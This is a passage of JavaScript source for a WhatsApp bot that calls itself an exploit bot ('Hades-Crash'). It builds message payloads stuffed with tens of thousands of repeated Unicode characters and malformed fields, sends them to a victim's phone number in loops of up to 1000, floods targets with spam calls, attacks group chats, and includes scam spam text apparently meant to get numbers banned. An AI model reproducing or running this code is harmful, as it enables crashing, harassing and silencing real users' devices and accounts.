            text: ' 🩸저스틴공𝗔𝗿𝗴𝗮𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹🔥🩸저스틴공𝗔𝗿𝗴𝗮𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹🔥 🩸 ' + " \u2003".repeat(30000) + " ꦾ".repeat(2000)
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: '@ ᔫ 𖣂 𝐃𝐀𝐍𝐆𝐄𝐑 𝐈𝐍𝐅𝐈𝐓𝐘 𖣂 ᔮ🩸' + " ꦾ".repeat(2000), 
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: "@ ᔫ 𖣂 𝐃𝐀𝐍𝐆𝐄𝐑 𝐈𝐍𝐅𝐈𝐓𝐘 𖣂 ᔮ🩸" + " ꦾ".repeat(2000), 
                },
                footer: {
                  text: "phynx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000)
                }
              }
            ]
          }
        }
      }
    }
  }, {});

  // Kirim pesan
  await arga.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });

  // Tunggu sebentar biar terkirim
  await sleep(1500);

  // Delete hanya pesan ini, gak sentuh fungsi lain
  await arga.sendMessage(target, {
    delete: {
      remoteJid: target,
      fromMe: true,
      id: msg.key.id,
      participant: '0@s.whatsapp.net'
    }
  });

  console.log(chalk.green(`✅ Attack Group To ${target}`));
}

async function frezios(target) {
      let frezios = "𑇂𑆵𑆴𑆿".repeat(60000);
      await arga.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: frezeios,
            url: "Ai",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    
switch (command) {

case "arga": case "menu": {
      
      const fs = require('fs'); // Untuk baca file
    
    const captionnya = `( 👋🏻 ) - ${m.pushName} 
> ようこそ。私は ArgaOffc によって設計された WhatsApp エクスプロイトボットです。ご利用をお楽しみください。 🚀
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : ArgaOffc
\`⭔\` Mode : Public Bot
\`⭔\` Status : Public
\`⭔\` Version : 1 Gen 2🎭
\`⭔\` Name Scrip : Hades-Crash

╭────「 𝐌𝐞𝐧𝐮 」────╮
│▢ .Bugmenu
│▢ .tqto
│▢ .owner
╰────────────────╯
▪ Запрещено копировать или использовать этот скрипт без разрешения!
▪ Только для официальных пользователей HadesCrash.
▪ Нарушение приведет к санкциям.

* © 2025 - *Arga Official*

╰┈➤ 𝖲𝖾𝗅𝗅𝖾𝖼𝗍 𝖳𝗈 𝖡𝗎𝗍𝗍𝗈𝗇 𝖡𝖾𝗅𝗈𝗐
`
let buttons = [
       { buttonId: ".ownerarga", buttonText: { displayText: "◇ Owner Menu" } },
        { buttonId: ".bugmenu", buttonText: { displayText: "◇ Bug Menu" } }, 
         { buttonId: ".tqto", buttonText: { displayText: "◇ Thanks To" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
	    gifPlayback: true,
	    caption: captionnya,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
              title: `₺͢𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟`,
                body: `⏤͟͟͞͞Arga Official`,
                  thumbnailUrl: `https://files.catbox.moe/rb3nar.jpg`,
                    sourceUrl: ``,
                       mediaType: 1,
                         renderLargerThumbnail: true
                          }
                        },
                  footer: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟",
                    buttons: buttons,
                  viewOnce: true,
                headerType: 6
               };

    await arga.sendMessage(m.chat, buttonMessage, { quoted: ftoko });       
     await arga.sendMessage(m.chat, {audio: fs.readFileSync('./sound/arga.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
                }
break;
case "hades-button": {
if (!isAccargaDev) return arga("Fitur Khusus User Premium");
if (!q) return argaReply(`*Example : ${command} 62xxx*`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
    const captionText = `
𝐓𝐚𝐫𝐠𝐞𝐭 : *${pepec}* 
𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐞𝐥𝐞𝐜𝐭 𝐁𝐮𝐭𝐭𝐨𝐧 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 :
`;

    const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: '𝐒𝐞𝐥𝐞𝐜𝐭 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐮𝐠' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟",
                sections: [
                  {
                    title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜɢ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                    highlight_label: "",
                    rows: [
                      { title: "🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͊͢𝘀-𝙓͋𝙛𝙞̰𝙩𝙭̂𝙮𝙖ͨ͢𝙡ཀ͒͜͡⬺͢᭟", description: "Fc Invisble", id: `.fcinvis ${pepec}` },
                      { title: "🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͊͢𝘀-𝙓𝙛͋𝙖͓𝙡͒𝙩𝙮͙͘𝙯̌̌͢𝙓ཀ͒͜͡⬺᭟", description: "Delay Invis", id: `.xdelayvcx ${pepec}` }, 
                      { title: "🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͊͢𝘀-𝙀𝙭𝙘͊͢𝙖𝙣͊͒𝙤𝙧ཀ͒͜͡⬺͢᭟", description: "Blank Click", id: `.xvsblank ${pepec}` },
                      { title: "🎭⃟༑⌁⭚𝗛͍𝗮͊͊͊͊͊͊𝗱𝗲͊͢𝘀-𝙓𝙩𝙧ͨ𝙖̽̽̽𝙑͙͛𝙭ཀ͒͜͡⬺᭟", description: "Spam Call", id: `.spamcall ${pepec}` },
                    ]
                  }
                ]
            })
        },
        viewOnce: true
    }
]

    await arga.sendMessage(
        m.chat,
        {
            document: {
                url: 'https://files.catbox.moe/k14raw.jpg',
            },
            mimetype: "application/pdf",
            pageCount: 2025,
            fileName: `𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟`,
            fileLength: 1000000, // Perbaikan ukuran file agar tidak error
            mp4Thumbnail: { url: 'https://files.catbox.moe/rb3nar.jpg' },
            caption: captionText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    mediaType: 1,
                    mediaUrl: 'https://files.catbox.moe/rb3nar.jpg',
                    renderLargerThumbnail: true,
                    showAdAttribution: true,
                    sourceUrl: '120363375427625764@newsletter',
                    thumbnailUrl: 'https://files.catbox.moe/rb3nar.jpg', 
                    title: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟᭟",
                    body: "",
                    mentionedJid: [m.sender],
                    isForwarded: true,
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: arga.decodeJid(arga.user.id),
                },
            },
            footer: wm,
            buttons: flowActions,
            headerType: 1,
            viewOnce: true,
        },
        { quoted: ftoko }
    );
}
break;
case "bugmenu": {
let msgbug = `( 👋🏻 ) - Hello  ${m.pushName} ,
ようこそ。私は ArgaOffc によって設計された WhatsApp エクスプロイトボットです。ご利用をお楽しみください🚀
𓆩 *INFORMATION BOT* 𓆪
\`✵\` Bᴏᴛ Nᴀᴍᴇ : 𝙷𝚊𝚍𝚎𝚜𝙲𝚛𝚊𝚜
\`✵\` Vᴇʀsɪᴏɴ : 1. Gen2
\`✵\` Creatoe : 𝙰𝚛𝚐𝚊𝙾𝚏𝚏𝚌
\`✵\` Sᴛᴀᴛᴜs : Fʀᴇᴇ,Vᴇʀsɪᴏɴ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
͏͏͏͏͏
計さ *BUG MENU*
 ⌬ Fcinvis 628xxxx
 ⌬ Xvsblank 628xxxx
 ⌬ SystemVcx 628xxxx
 ⌬ XdelayVcx 628xxxx
 ⌬ Frezios 628xxxx
 ⌬ Hades-button 628xxxx

*計さ BUG 𝐆𝐑𝐎𝐔𝐏*
 ⌬ Blankgc InplaceGc
 ⌬ Delaygc InplaceGc
 ⌬ XvcZ InplaceGc
 
 計さ MT BANED*
 ⌬ mt-banedv1 arga
 ⌬ mt-banedv2 arga
 ⌬ mt-banedv3 arga
 
▪ Запрещено копировать или использовать этот скрипт без разрешения!
▪ Только для официальных пользователей HadesCrash.
▪ Нарушение приведет к санкциям.

> © 2025 - *Arga Official*
`
let buttons = [
        { buttonId: ".ownerarga", buttonText: { displayText: "◇ Owner Menu" } },
        { buttonId: ".bugmenu", buttonText: { displayText: "◇ Bug Menu" } }, 
         { buttonId: ".tqto", buttonText: { displayText: "◇ Thanks To" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
        gifPlayback: true,
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                newsletterName: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟"
            }
        },
        footer: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await arga.sendMessage(m.chat, buttonMessage, { quoted: ftoko });

await arga.sendMessage(m.chat, {audio: fs.readFileSync('./sound/arga.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break;

case "ownerarga": case "owner": {
let msgbug = `
\`[ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 ]\`
▢ .addowner
▢ .delowner [ Number ]
▢ .addprem [ Number ]
▢ .delprem [ Number ]
▢ .self  [ Mode Privat ]
▢ .public  [ Mode Public ]
`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "⍣𝐁𝐚͠𝐜͜𝐤 𝐌͠𝐞͜𝐧͠𝐮⍣" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
        gifPlayback: true,
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                newsletterName: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟"
            }
        },
        footer: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await arga.sendMessage(m.chat, buttonMessage, { quoted: ftoko });

await arga.sendMessage(m.chat, {audio: fs.readFileSync('./sound/arga.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break;

case "tqto": {
let msgbug = `\`[ 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 ]\`
argaOffc [ Creator ]
Family [ Support ]
AllahSwt [ My God ]
All Pengguna Script
`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "⍣𝐁𝐚͠𝐜͜𝐤 𝐌͠𝐞͜𝐧͠𝐮⍣" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
        gifPlayback: true,
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                newsletterName: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟"
            }
        },
        footer: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀᭟",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await arga.sendMessage(m.chat, buttonMessage, { quoted: ftoko });

await arga.sendMessage(m.chat, {audio: fs.readFileSync('./sound/arga.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break;
            
case "public": { 
if (!isAccargaDev) return argaReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
arga.public = true
argaReply(`*\`Succes Beralih mode ke mode public\`*`)
}
break
case "self": { 
if (!isAccargaDev) return argaReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
arga.public = false
argaReply(`*\`Succes Beralih mode ke mode self\`*`)
}
break

case "addowner":{
if (!isAccargaDev) return argaReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
if (!args[0]) return argaReply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await arga.onWhatsApp(prrkek)
if (ceknya.length == 0) return argaReply(`*\`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!\`*`)
ownerbot.push(prrkek)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(ownerbot))
argaReply(`*\`Nomor ${prrkek} Telah Menjadi Owner!\`*`)
}
break

case "delowner":{
if (!isAccargaDev) return argaReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
if (!args[0]) return argaReply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerbot.indexOf(ya)
ownerbot.splice(unp, 1)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(ownerbot))
argaReply(`*\`Nomor ${ya} Telah Di Hapus Owner!\`*`)
}    
break

case "addprem":{
if (!isAccargaDev && !isCreator) return argaReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
if (!args[0]) return argaReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await arga.onWhatsApp(prrkek)
if (ceknya.length == 0) return argaReply(`*\`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!\`*`)
ownerbot.push(prrkek)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(ownerbot))
argaReply(`*\`Nomor ${prrkek} Telah Menjadi Premium!\`*`)
}
break


case "delprem":{
if (!isAccargaDev && !isCreator) return argaReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
if (!args[0]) return argaReply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerbot.indexOf(ya)
ownerbot.splice(unp, 1)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(ownerbot))
argaReply(`*\`Nomor ${ya} Telah Di Hapus Premium!\`*`)
}    
break

//BATAS CASE BUG//
case "clearbug":
        {
          if (!isAccargaDev) return argaReply("𝗙𝗶𝘁𝘂𝗿 𝗞𝗵𝘂𝘀𝘂𝘀 𝙊𝙬𝙣𝙚𝙧!!");
          if (!q) return argaReply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ${prefix + command} 𝟲𝟮×××`);
          let pepec = q.replace(/[^0-9]/g, "");
          if (pepec.startsWith("0"))
            return argaReply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝟲𝟮×××`);
          let target = pepec + "@s.whatsapp.net";
          for (let i = 0; i < 3; i++) {
            await arga.sendMessage(target, {
              text: "𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂",
            });
          }
          argaReply("*\`𝘿𝙊𝙉𝙀 𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂!\`*");
        }
        break;


case 'fcinvis': {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccargaDev || sender === botNumber;
    if (!isAccargaDev) 
        return argaReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return argaReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return argaReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    arga.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 20; i++) {
    await ForceX(target);
    await sleep(1500);
   }
}
break;


case 'systemvcx': {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccargaDev || sender === botNumber;
    if (!isAccargaDev) 
        return argaReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return argaReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return argaReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    arga.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
    await XiosVirus(target);
    await QDIphone(target);   
    await sleep(1500);
   }
}
break;

case 'frezios': {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccargaDev || sender === botNumber;
    if (!isAccargaDev) 
        return argaReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return argaReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return argaReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    arga.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
    await frezios(target);
    await frezios(target);   
    await sleep(1500);
   }
}
break;

case "xdelayvcx": {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccargaDev || sender === botNumber;
    if (!isAccargaDev) 
        return argaReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return argaReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return argaReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    arga.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 1000; i++) {
    await bulldozerXDrain(target);    
    await protocolbug2(target);
    await sleep(1500);
   }
}
break;

case "xvsblank": {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccargaDev || sender === botNumber;
    if (!isAccargaDev) 
        return argaReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return argaReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return argaReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    arga.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 20; i++) {
    await invicXblank(target);
    await sleep(1500);
   }
}
break;


case "spamcall": {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccargaDev || sender === botNumber;
    if (!isAccargaDev) 
        return argaReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return argaReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return argaReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    arga.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/k14raw.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 500; i++) {
    await sendOfferVideoCall(target);
    await sendOfferCall(target);    
    await sleep(1000);
   }
}
break;

case 'xvcz': case 'delaygc': case 'blankgc': {
    const maxSend = 10;
    for (let i = 0; i < maxSend; i++) {
        if (command === 'blankgc') {
            await BlankGroup(m.chat);
        } else if (command === 'xvcz') {
            await BlankGroup(m.chat);
        } else if (command === 'xvcz') {
            await ForceSpamSafe(m.chat);
            await BlankGroup(m.chat);
            await sleep(1500);
        }
    }
    m.reply(`Selesai mengirim bug tipe ${command} sebanyak ${maxSend} kali`);
}
break;      






case "mt-banedv1": {
if (!isAccargaDev) return argaReply(`*\`Fitur ini Khusus Owner\`*`)
if (!q) return argaReply(' Enter the Target number Prefix "+" and Country Code')
await arga.sendMessage(from, {text: `METODE FAKECHAT
🎰 Bem -vindo Carnaval com jackpot! 💰 BALANÇO inicial r $ 28,00 + 55 Giros Gátis sem depósito no slot *Blaze brasileiro *! 🔥 Aproveite a sensação de *Diamond Safari *, o último slot com jackpot progressivo e bônus épico. Esta promoção é válida apenas 24 horas, junte -se imediatamente! 🕒 tocando agora em: https://bit.ly/amazonspin 🏧

BUY MURBAN KE t.me/ArgaOffc${q}`},{quoted: m})
await sleep(2000)
argaReply(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
break
}

case "mt-banedv2": {
if (!isAccargaDev) return argaReply(`*\`Fitur ini Khusus Owner\`*`)
if (!q) return argaReply(' Enter the Target number Prefix "+" and Country Code')
await arga.sendMessage(from, {text: `2NOMER
